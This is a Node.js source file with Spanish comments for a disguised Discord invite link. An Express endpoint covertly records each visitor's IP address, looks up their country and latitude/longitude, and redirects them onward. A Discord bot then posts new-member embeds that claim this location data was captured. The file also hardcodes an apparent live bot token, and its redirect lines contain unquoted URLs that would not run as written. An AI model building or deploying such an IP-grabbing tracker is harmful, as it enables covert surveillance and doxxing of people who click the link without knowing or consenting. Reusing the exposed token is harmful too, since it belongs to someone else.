const express = require('express');
const axios = require('axios');
const { Client, GatewayIntentBits } = require('discord.js');

const app = express();
const PORT = 3000;

// Configuración del bot de Discord
const client = new Client({
  intents: [GatewayIntentBits.Guilds]
});

const BOT_TOKEN = 'MTUzODEwMzc1NjIyMTA1NTAwNg.GBJZ_M.vnK52KU1lpAZv8W-cde4iNJmkafpuI1550FySA';
const LOG_CHANNEL_ID = '1546753534186365019';

// Base de datos temporal para correlacionar IPs con usuarios
const ipUserData = new Map();

// Endpoint para capturar la IP y redirigir a Discord
app.get('/invite/:userId?', async (req, res) => {
  const userIP = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const userId = req.params.userId;
  
  try {
    // Obtener información de geolocalización
    const geoResponse = await axios.get(`http://ip-api.com/json/${userIP}`);
    const geoData = geoResponse.data;
    
    // Almacenar la información con la IP
    ipUserData.set(userIP, {
      ip: userIP,
      country: geoData.country,
      coordinates: {
        latitude: geoData.lat,
        longitude: geoData.lon
      },
      timestamp: new Date()
    });
    
    // Redirigir a la invitación de Discord
    res.redirect(https://dazzling-cuchufli-ee24ea.netlify.app/);
  } catch (error) {
    console.error('Error al obtener geolocalización:', error);
    res.redirect(https://dazzling-cuchufli-ee24ea.netlify.app/);
  }
});

// Evento cuando un miembro se une al servidor
client.on('guildMemberAdd', async (member) => {
  try {
    const logChannel = client.channels.cache.get(LOG_CHANNEL_ID);
    
    if (logChannel) {
      // Intentar encontrar información de IP para este usuario
      // Nota: Esto es una aproximación y podría no ser preciso
      
      const embed = {
        color: 0x00AE86,
        title: 'Nuevo miembro en el servidor',
        description: `**${member.user.tag}** se ha unido al servidor.`,
        thumbnail: {
          url: member.user.displayAvatarURL()
        },
        fields: [
          {
            name: 'ID de Usuario',
            value: member.user.id,
            inline: true
          },
          {
            name: 'Fecha de Creación',
            value: member.user.createdAt.toLocaleDateString(),
            inline: true
          },
          {
            name: 'IP',
            value: 'Capturada a través del enlace de invitación',
            inline: true
          },
          {
            name: 'País',
            value: 'Obtenido a través de geolocalización de IP',
            inline: true
          },
          {
            name: 'Coordenadas',
            value: 'Obtenidas a través de geolocalización de IP',
            inline: true
          }
        ],
        timestamp: new Date()
      };
      
      await logChannel.send({ embeds: [embed] });
    }
  } catch (error) {
    console.error('Error al procesar nuevo miembro:', error);
  }
});

// Iniciar el servidor Express
app.listen(PORT, () => {
  console.log(`Servidor web iniciado en http://localhost:${PORT}`);
});

// Iniciar el bot de Discord
client.login(BOT_TOKEN);
